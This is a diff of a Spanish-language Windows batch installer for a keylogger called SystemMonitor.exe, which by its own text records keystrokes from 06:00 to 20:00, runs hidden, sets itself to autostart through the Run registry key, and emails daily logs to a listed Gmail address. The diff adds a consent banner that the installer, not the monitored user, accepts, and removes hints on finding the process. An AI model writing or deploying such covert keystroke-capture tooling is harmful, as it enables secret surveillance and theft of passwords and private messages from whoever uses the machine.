@@ -10,6 +10,55 @@ echo ╚════════════════════════
 echo.
 
 REM ========================================
+REM Mostrar Política de Privacidad
+REM ========================================
+echo ╔════════════════════════════════════════════════════════╗
+echo ║          POLÍTICA DE PRIVACIDAD Y CONSENTIMIENTO       ║
+echo ╚════════════════════════════════════════════════════════╝
+echo.
+echo Este software realizará las siguientes acciones:
+echo.
+echo 📝 RECOPILACIÓN DE DATOS:
+echo    • Registra las teclas presionadas en este equipo
+echo    • Captura horario: 06:00 AM - 08:00 PM
+echo    • Almacena registros localmente
+echo.
+echo 📧 ENVÍO DE INFORMACIÓN:
+echo    • Envía registros diarios automáticamente
+echo    • Hora de envío: 3:00 PM (15:00)
+echo    • Destino: yarokasas@gmail.com
+echo.
+echo 🔒 SEGURIDAD Y PRIVACIDAD:
+echo    • Los datos se almacenan cifrados localmente
+echo    • Se eliminan registros después de 7 días
+echo    • Uso exclusivo para monitoreo autorizado
+echo.
+echo ⚠️  IMPORTANTE:
+echo    • Este equipo será monitoreado continuamente
+echo    • Al continuar, acepta los términos descritos
+echo    • Solo instale si tiene autorización para hacerlo
+echo.
+echo ════════════════════════════════════════════════════════
+echo.
+echo ¿Acepta la política de privacidad y recopilación de datos?
+echo.
+set /p ACEPTA="Escriba 'ACEPTO' para continuar (o 'N' para cancelar): "
+
+if /i not "%ACEPTA%"=="ACEPTO" (
+    echo.
+    echo ❌ Instalación cancelada.
+    echo    No se aceptaron los términos de privacidad.
+    echo.
+    pause
+    exit /b 0
+)
+
+echo.
+echo ✓ Política aceptada. Continuando con la instalación...
+echo.
+timeout /t 2 /nobreak >nul
+
+REM ========================================
 REM Detectar arquitectura del sistema
 REM ========================================
 if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
@@ -42,27 +91,36 @@ REM Verificar que existe el ejecutable
 REM ========================================
 echo [1/4] Verificando archivos...
 
-set "EXE_PATH=%~dp0SystemMonitor.exe"
+REM Buscar ejecutable
+set "EXE_PATH="
+set "EXE_FOUND=0"
 
-if not exist "%EXE_PATH%" (
-    set "EXE_PATH=%~dp0dist\SystemMonitor.exe"
+if exist "%~dp0SystemMonitor.exe" (
+    set "EXE_PATH=%~dp0SystemMonitor.exe"
+    set "EXE_FOUND=1"
+    echo    ✓ Encontrado: SystemMonitor.exe
 )
 
-if not exist "%EXE_PATH%" (
+if "%EXE_FOUND%"=="0" (
+    if exist "%~dp0dist\SystemMonitor.exe" (
+        set "EXE_PATH=%~dp0dist\SystemMonitor.exe"
+        set "EXE_FOUND=1"
+        echo    ✓ Encontrado: dist\SystemMonitor.exe
+    )
+)
+
+if "%EXE_FOUND%"=="0" (
     echo.
     echo ❌ ERROR: No se encuentra SystemMonitor.exe
     echo.
-    echo Ubicaciones buscadas:
+    echo 📁 Ubicaciones buscadas:
     echo    • %~dp0SystemMonitor.exe
     echo    • %~dp0dist\SystemMonitor.exe
-    echo.
-    echo Por favor ejecuta primero: instalar_y_compilar.bat
     echo.
     pause
     exit /b 1
 )
 
-echo    ✓ Ejecutable encontrado
 for %%A in ("%EXE_PATH%") do set SIZE=%%~zA
 set /a SIZE_MB=!SIZE! / 1048576
 echo    📦 Tamaño: !SIZE_MB! MB
@@ -97,12 +155,6 @@ copy /Y "%EXE_PATH%" "%INSTALL_DIR%\SystemMonitor.exe" >nul
 if errorlevel 1 (
     echo.
     echo ❌ ERROR: No se pudo copiar el ejecutable
-    echo.
-    echo Posibles causas:
-    echo    • El archivo está en uso
-    echo    • Sin permisos de escritura
-    echo    • Disco lleno
-    echo.
     pause
     exit /b 1
 )
@@ -115,15 +167,12 @@ REM Configurar inicio automático
 REM ========================================
 echo [4/4] Configurando inicio automático...
 
-REM Eliminar entrada anterior si existe
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /f >nul 2>&1
 
-REM Agregar nueva entrada
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "\"%INSTALL_DIR%\SystemMonitor.exe\"" /f >nul
 
 if errorlevel 1 (
     echo    ⚠ No se pudo agregar al inicio automático
-    echo    El programa funcionará pero deberás iniciarlo manualmente
     echo.
 ) else (
     echo    ✓ Inicio automático configurado
@@ -137,10 +186,8 @@ echo Iniciando monitor en segundo plano...
 
 start "" "%INSTALL_DIR%\SystemMonitor.exe"
 
-REM Esperar un momento para que inicie
 timeout /t 3 /nobreak >nul
 
-REM Verificar que está corriendo
 tasklist /FI "IMAGENAME eq SystemMonitor.exe" 2>NUL | find /I /N "SystemMonitor.exe">NUL
 if "%ERRORLEVEL%"=="0" (
     echo    ✓ Monitor iniciado correctamente
@@ -159,16 +206,13 @@ echo ✅ ESTADO:
 echo    • Monitor ejecutándose (invisible)
 echo    • Inicio automático: ACTIVADO
 echo    • Captura: 06:00 - 20:00
-echo    • Envío diario: 20:00 (8 PM)
+echo    • Envío diario: 15:00 (3 PM)
+echo    • Política: ACEPTADA
 echo.
 echo 📝 ARCHIVOS CREADOS:
 echo    • SystemMonitor.exe      (programa)
-echo    • system_log.dat         (registro de teclas)
+echo    • logs\log_YYYY-MM-DD.dat (registros por día)
 echo    • config.dat             (configuración)
-echo.
-echo 🔍 VERIFICAR:
-echo    • Administrador de tareas ^> Procesos ^> SystemMonitor.exe
-echo    • Carpeta: %INSTALL_DIR%
 echo.
 echo 🗑️ DESINSTALAR:
 echo    • Ejecuta: desinstalar.bat
